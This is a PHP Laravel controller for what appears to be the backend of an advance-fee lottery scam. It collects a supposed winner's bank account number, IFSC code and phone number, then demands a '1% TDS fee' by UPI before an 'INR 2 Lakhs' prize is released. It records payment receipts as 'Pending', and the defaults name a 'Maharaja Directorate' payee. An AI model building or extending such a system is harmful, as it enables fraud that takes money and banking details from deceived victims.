<?php

namespace App\Http\Controllers;

use App\Models\Setting;
use App\Models\TdsPayment;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\File;

class TdsController extends Controller
{
    /**
     * Show the prize withdrawal bank details form.
     */
    public function showWithdrawalForm(Request $request)
    {
        $bookingRef = trim($request->input('ref', session('tds_booking_ref', '')));
        $customerName = trim($request->input('name', session('tds_customer_name', '')));
        $customerPhone = trim($request->input('phone', session('tds_customer_phone', '')));
        $prizeAmount = trim($request->input('amount', session('tds_prize_amount', 'INR 2 Lakhs')));

        // If booking reference is passed, also attempt to load existing details
        if (!empty($bookingRef) && (empty($customerName) || empty($customerPhone))) {
            $storagePath = storage_path('app/booked_tickets.json');
            if (File::exists($storagePath)) {
                $bookings = json_decode(File::get($storagePath), true) ?: [];
                foreach ($bookings as $b) {
                    if (strtoupper($b['booking_ref'] ?? '') === strtoupper($bookingRef)) {
                        $customerName = $customerName ?: ($b['customer_name'] ?? '');
                        $customerPhone = $customerPhone ?: ($b['customer_mobile'] ?? '');
                        if (empty($request->input('amount')) && !empty($b['prize_amount'])) {
                            $prizeAmount = $b['prize_amount'];
                        }
                        break;
                    }
                }
            }
        }

        $calc = TdsPayment::calculateTds($prizeAmount, 1.0);

        return view('frontend.pages.withdrawal', compact(
            'bookingRef',
            'customerName',
            'customerPhone',
            'prizeAmount',
            'calc'
        ));
    }

    /**
     * Handle submission of the withdrawal bank details form.
     */
    public function processWithdrawalForm(Request $request)
    {
        $validated = $request->validate([
            'customer_name' => 'required|string|max:150',
            'customer_phone' => 'required|string|max:20',
            'account_number' => 'required|string|min:6|max:35',
            'ifsc_code' => 'required|string|min:4|max:20',
            'bank_name' => 'nullable|string|max:100',
            'prize_amount' => 'nullable|string|max:100',
            'booking_ref' => 'nullable|string|max:100',
        ]);

        $prizeAmount = $validated['prize_amount'] ?: 'INR 2 Lakhs';
        $calc = TdsPayment::calculateTds($prizeAmount, 1.0);

        $withdrawalData = [
            'booking_ref' => $validated['booking_ref'] ?? '',
            'customer_name' => $validated['customer_name'],
            'customer_phone' => $validated['customer_phone'],
            'account_number' => $validated['account_number'],
            'ifsc_code' => strtoupper($validated['ifsc_code']),
            'bank_name' => $validated['bank_name'] ?? '',
            'prize_amount' => $prizeAmount,
            'winning_amount' => $calc['winning_numeric'],
            'winning_formatted' => $calc['winning_formatted'],
            'tds_amount' => $calc['tds_numeric'],
            'tds_formatted' => $calc['tds_formatted'],
            'tds_percentage' => $calc['percentage'],
        ];

        session(['tds_withdrawal_session' => $withdrawalData]);

        return redirect()->route('tds.payment');
    }

    /**
     * Show the dynamic 1% TDS Payment QR page.
     */
    public function showTdsPayment(Request $request)
    {
        $sessionData = session('tds_withdrawal_session', []);

        // Fallbacks if user navigated with GET parameters
        $bookingRef = $sessionData['booking_ref'] ?? $request->input('ref', '');
        $customerName = $sessionData['customer_name'] ?? $request->input('name', 'Lucky Winner');
        $customerPhone = $sessionData['customer_phone'] ?? $request->input('phone', '');
        $accountNumber = $sessionData['account_number'] ?? $request->input('account', '');
        $ifscCode = $sessionData['ifsc_code'] ?? $request->input('ifsc', '');
        $bankName = $sessionData['bank_name'] ?? $request->input('bank', '');
        $prizeAmount = $sessionData['prize_amount'] ?? $request->input('amount', 'INR 2 Lakhs');

        $calc = TdsPayment::calculateTds($prizeAmount, 1.0);
        $tdsAmount = $sessionData['tds_amount'] ?? $calc['tds_numeric'];
        $tdsFormatted = $sessionData['tds_formatted'] ?? $calc['tds_formatted'];
        $winningAmount = $sessionData['winning_amount'] ?? $calc['winning_numeric'];
        $winningFormatted = $sessionData['winning_formatted'] ?? $calc['winning_formatted'];

        // Retrieve Active UPI Gateway Settings
        $upiId = Setting::get('upi_id', 'maharajalottery@okhdfcbank');
        $payeeName = Setting::get('payee_name', 'Maharaja Directorate');
        $upiQrImage = Setting::get('upi_qr_image', '');

        // Generate dynamic UPI intent link with exact 1% TDS amount
        $note = 'TDS 1% Fee - ' . ($bookingRef ?: 'Prize Claim');
        $upiUrl = "upi://pay?pa=" . urlencode($upiId) .
            "&pn=" . urlencode($payeeName) .
            "&am=" . number_format($tdsAmount, 2, '.', '') .
            "&cu=INR" .
            "&tn=" . urlencode($note);

        return view('frontend.pages.tds_payment', compact(
            'bookingRef',
            'customerName',
            'customerPhone',
            'accountNumber',
            'ifscCode',
            'bankName',
            'prizeAmount',
            'winningAmount',
            'winningFormatted',
            'tdsAmount',
            'tdsFormatted',
            'upiId',
            'payeeName',
            'upiQrImage',
            'upiUrl'
        ));
    }

    /**
     * Submit TDS Payment with Screenshot / Receipt Proof and persist to MySQL.
     */
    public function submitTdsPayment(Request $request)
    {
        $request->validate([
            'customer_name' => 'required|string|max:150',
            'customer_phone' => 'required|string|max:20',
            'account_number' => 'required|string|max:35',
            'ifsc_code' => 'required|string|max:20',
            'bank_name' => 'nullable|string|max:100',
            'booking_ref' => 'nullable|string|max:100',
            'winning_prize_text' => 'nullable|string|max:100',
            'winning_amount' => 'nullable|numeric',
            'tds_amount' => 'nullable|numeric',
            'utr_number' => 'nullable|string|max:100',
            'receipt_file' => 'nullable|file|mimes:jpeg,png,jpg,webp,pdf|max:10240',
        ]);

        $receiptImagePath = null;
        $uploadDir = public_path('uploads/tds_receipts');
        if (!File::exists($uploadDir)) {
            File::makeDirectory($uploadDir, 0755, true);
        }

        if ($request->hasFile('receipt_file')) {
            $file = $request->file('receipt_file');
            $fileName = 'tds_' . time() . '_' . uniqid() . '.' . $file->getClientOriginalExtension();
            $file->move($uploadDir, $fileName);
            $receiptImagePath = 'uploads/tds_receipts/' . $fileName;
        } elseif ($request->hasFile('receipt_image')) {
            $file = $request->file('receipt_image');
            $fileName = 'tds_' . time() . '_' . uniqid() . '.' . $file->getClientOriginalExtension();
            $file->move($uploadDir, $fileName);
            $receiptImagePath = 'uploads/tds_receipts/' . $fileName;
        }

        $prizeText = $request->input('winning_prize_text', 'INR 2 Lakhs');
        $calc = TdsPayment::calculateTds($prizeText, 1.0);

        $winningAmount = (float) $request->input('winning_amount', $calc['winning_numeric']);
        $tdsAmount = (float) $request->input('tds_amount', $calc['tds_numeric']);

        // Persist to database table
        $tdsRecord = TdsPayment::create([
            'booking_ref' => $request->input('booking_ref'),
            'ticket_number' => $request->input('ticket_number'),
            'customer_name' => $request->input('customer_name'),
            'customer_phone' => $request->input('customer_phone'),
            'account_number' => $request->input('account_number'),
            'ifsc_code' => strtoupper($request->input('ifsc_code')),
            'bank_name' => $request->input('bank_name'),
            'winning_prize_text' => $prizeText,
            'winning_amount' => $winningAmount,
            'tds_percentage' => 1.00,
            'tds_amount' => $tdsAmount,
            'utr_number' => $request->input('utr_number'),
            'receipt_image' => $receiptImagePath,
            'status' => 'Pending',
            'admin_notes' => 'Submitted by customer via online TDS verification portal.',
        ]);

        // Clean up temporary session
        session()->forget('tds_withdrawal_session');

        return response()->json([
            'success' => true,
            'message' => 'Congratulations! Your 1% TDS payment and withdrawal request have been submitted successfully.',
            'record_id' => $tdsRecord->id,
            'customer_name' => $tdsRecord->customer_name,
            'winning_amount' => '₹' . number_format($tdsRecord->winning_amount),
            'tds_amount' => '₹' . number_format($tdsRecord->tds_amount),
            'account_masked' => $tdsRecord->masked_account,
        ]);
    }
}
